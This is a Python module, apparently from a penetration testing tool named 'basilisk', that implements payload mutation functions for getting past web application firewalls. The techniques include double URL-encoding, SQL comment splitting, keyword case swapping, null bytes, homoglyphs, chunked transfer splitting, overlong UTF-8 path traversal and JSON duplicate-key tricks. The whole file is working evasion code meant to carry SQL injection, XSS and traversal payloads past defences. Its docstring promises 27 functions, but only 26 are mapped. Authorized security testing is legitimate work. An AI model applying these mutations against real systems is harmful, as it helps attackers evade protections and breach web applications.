"""WAF bypass encoding strategies — 27 payload mutation functions.

Each function transforms a payload string to evade a specific class of WAF
inspection rule. Functions are collected in :data:`ENCODING_FUNCTIONS` mapping
for use by :class:`basilisk.utils.waf_bypass.WafBypassEngine`.
"""

from __future__ import annotations

import random
import re
from collections.abc import Callable
from dataclasses import dataclass
from urllib.parse import quote


@dataclass
class BypassResult:
    """Result of a bypass attempt."""
    original: str
    encoded: str
    technique: str
    passed: bool = False
    status: int = 0
    waf_name: str = ""


# ---------------------------------------------------------------------------
# Encoding functions
# ---------------------------------------------------------------------------

def _double_encode(payload: str) -> str:
    """Double URL-encode."""
    return quote(quote(payload, safe=""), safe="")


def _case_swap(payload: str) -> str:
    """Alternate case of SQL/JS keywords."""
    keywords = {
        "SELECT": "sElEcT", "UNION": "uNiOn", "OR": "oR", "AND": "aNd",
        "FROM": "fRoM", "WHERE": "wHeRe", "ORDER": "oRdEr", "INSERT": "iNsErT",
        "UPDATE": "uPdAtE", "DELETE": "dElEtE", "DROP": "dRoP",
        "EXEC": "eXeC", "SLEEP": "sLeEp", "WAITFOR": "wAiTfOr",
        "BENCHMARK": "bEnChMaRk",
        "script": "ScRiPt", "alert": "aLeRt", "onerror": "oNeRrOr",
        "onload": "oNlOaD", "javascript": "jAvAsCrIpT",
    }
    result = payload
    for kw, replacement in keywords.items():
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        result = pattern.sub(replacement, result, count=1)
    return result


def _comment_split(payload: str) -> str:
    """Insert SQL comments within keywords."""
    keywords = ["OR", "AND", "SELECT", "UNION", "FROM", "WHERE", "ORDER", "GROUP"]
    result = payload
    upper = result.upper()
    for kw in keywords:
        padded = f" {kw} "
        if padded in upper:
            idx = upper.index(padded)
            replacement = f" {kw[0]}/**/{kw[1:]} "
            result = result[:idx] + replacement + result[idx + len(padded):]
            upper = result.upper()
    return result


def _whitespace_variant(payload: str) -> str:
    """Replace spaces with tab characters."""
    return payload.replace(" ", "\t")


def _null_byte(payload: str) -> str:
    """Insert null byte before quote."""
    return payload.replace("'", "%00'").replace('"', '%00"')


def _unicode_normalize(payload: str) -> str:
    """Replace characters with Unicode homoglyphs."""
    table = {"'": "\u02bc", '"': "\u201c", "<": "\uff1c", ">": "\uff1e"}
    result = payload
    for orig, repl in table.items():
        result = result.replace(orig, repl, 1)
    return result


def _multiline(payload: str) -> str:
    """Insert newlines within payload."""
    return payload.replace(" ", "%0a")


def _concat_function(payload: str) -> str:
    """Replace string literals with CONCAT() calls (MySQL)."""
    def _split_string(m: re.Match) -> str:
        s = m.group(1)
        if len(s) < 2:
            return m.group(0)
        mid = len(s) // 2
        return f"CONCAT('{s[:mid]}','{s[mid:]}')"
    return re.sub(r"'([^']{2,})'", _split_string, payload)


def _hpp(payload: str) -> str:
    """HTTP Parameter Pollution — split payload across repeated params."""
    return payload.replace(" ", "&q=")


def _chunked_transfer(payload: str) -> str:
    """Simulate chunked Transfer-Encoding splitting for WAF bypass."""
    chunks = []
    step = 4
    for i in range(0, len(payload), step):
        chunk = payload[i:i + step]
        chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
    chunks.append("0\r\n\r\n")
    return "".join(chunks)


def _multipart_form(payload: str) -> str:
    """Wrap payload in multipart/form-data boundary."""
    boundary = "----basilisk7x"
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="data"\r\n\r\n'
        f"{payload}\r\n"
        f"--{boundary}--"
    )


def _html_entity_encode(payload: str) -> str:
    """Encode as HTML numeric character references."""
    return "".join(f"&#{ord(c)};" for c in payload)


def _hex_entity_encode(payload: str) -> str:
    """Encode as HTML hex character references."""
    return "".join(f"&#x{ord(c):x};" for c in payload)


def _js_unicode_encode(payload: str) -> str:
    """Encode as JavaScript Unicode escapes."""
    return "".join(f"\\u{ord(c):04x}" for c in payload)


def _overlong_utf8(payload: str) -> str:
    """Generate overlong UTF-8 encoding for path traversal bypass."""
    table = {".": "%c0%2e", "/": "%c0%af", "\\": "%c1%9c"}
    result = payload
    for orig, repl in table.items():
        result = result.replace(orig, repl)
    return result


def _json_unicode_escape(payload: str) -> str:
    """Encode using JSON Unicode escapes (\\uXXXX)."""
    return "".join(f"\\u{ord(c):04x}" if not c.isalnum() else c for c in payload)


def _chunked_randomized(payload: str) -> str:
    """Chunked encoding with randomized chunk sizes (1-8 bytes)."""
    chunks = []
    i = 0
    while i < len(payload):
        size = random.randint(1, min(8, len(payload) - i))
        chunk = payload[i:i + size]
        chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
        i += size
    chunks.append("0\r\n\r\n")
    return "".join(chunks)


def _matrix_params(payload: str) -> str:
    """Insert matrix parameters into URL paths: /api/v1/users -> /api/v1;bsk=1/users."""
    if "/" in payload:
        parts = payload.rsplit("/", 1)
        if len(parts) == 2 and parts[0]:
            return f"{parts[0]};bsk=1/{parts[1]}"
    return f"{payload};bsk=1"


def _path_normalization(payload: str) -> str:
    """Path traversal normalization: /api/v1/users -> /api/v1/../v1/users."""
    if "/" not in payload:
        return payload
    parts = payload.split("/")
    if len(parts) >= 3:
        insert_at = 2
        seg = parts[insert_at - 1] if insert_at - 1 < len(parts) else ""
        return "/".join(parts[:insert_at]) + "/../" + seg + "/" + "/".join(parts[insert_at:])
    return payload


def _double_slash(payload: str) -> str:
    """Double slashes in path: /api/v1/users -> //api//v1//users."""
    return payload.replace("/", "//")


def _trailing_dot(payload: str) -> str:
    """Dot insertion in path segments: /api/v1/ -> /./api/./v1/."""
    return payload.replace("/", "/./")


def _json_unicode_keys(payload: str) -> str:
    """Unicode escape in JSON keys: {\"admin\":true} -> {\"\\u0061dmin\":true}."""
    def _escape_key(m: re.Match) -> str:
        key = m.group(1)
        if key:
            escaped = f"\\u{ord(key[0]):04x}{key[1:]}"
            return f'"{escaped}":'
        return m.group(0)
    return re.sub(r'"(\w+)"\s*:', _escape_key, payload)


def _json_scientific_numbers(payload: str) -> str:
    """Scientific notation in JSON: {\"id\": 1} -> {\"id\": 1e0}."""
    return re.sub(
        r':\s*(\d+)([,\s}])',
        lambda m: f': {m.group(1)}e0{m.group(2)}',
        payload,
    )


def _json_duplicate_keys(payload: str) -> str:
    """Duplicate key (last-wins): {\"admin\":true} -> {\"admin\":false,\"admin\":true}."""
    def _duplicate(m: re.Match) -> str:
        key = m.group(1)
        value = m.group(2).strip()
        return f'"{key}": null, "{key}": {value}'
    return re.sub(r'"(\w+)"\s*:\s*([^,}\]]+)', _duplicate, payload, count=1)


def _json_comment_injection(payload: str) -> str:
    """JSONC comment injection (parsed by JSON5/Node.js)."""
    if payload.startswith("{"):
        return payload[:1] + "/*bsk*/" + payload[1:]
    return "/*bsk*/ " + payload


def _header_case_variation(payload: str) -> str:
    """Mixed case for header-injected payloads."""
    result = []
    for i, c in enumerate(payload):
        if c.isalpha():
            result.append(c.upper() if i % 2 == 0 else c.lower())
        else:
            result.append(c)
    return "".join(result)


# ---------------------------------------------------------------------------
# Map encoding names to functions
# ---------------------------------------------------------------------------

ENCODING_FUNCTIONS: dict[str, Callable[[str], str]] = {
    "double_encode": _double_encode,
    "case_swap": _case_swap,
    "comment_split": _comment_split,
    "whitespace_variant": _whitespace_variant,
    "null_byte": _null_byte,
    "unicode_normalize": _unicode_normalize,
    "multiline": _multiline,
    "concat_function": _concat_function,
    "hpp": _hpp,
    "chunked_transfer": _chunked_transfer,
    "multipart_form": _multipart_form,
    "html_entity_encode": _html_entity_encode,
    "hex_entity_encode": _hex_entity_encode,
    "js_unicode_encode": _js_unicode_encode,
    "overlong_utf8": _overlong_utf8,
    "json_unicode_escape": _json_unicode_escape,
    "chunked_randomized": _chunked_randomized,
    "matrix_params": _matrix_params,
    "path_normalization": _path_normalization,
    "double_slash": _double_slash,
    "trailing_dot": _trailing_dot,
    "json_unicode_keys": _json_unicode_keys,
    "json_scientific_numbers": _json_scientific_numbers,
    "json_duplicate_keys": _json_duplicate_keys,
    "json_comment_injection": _json_comment_injection,
    "header_case_variation": _header_case_variation,
}
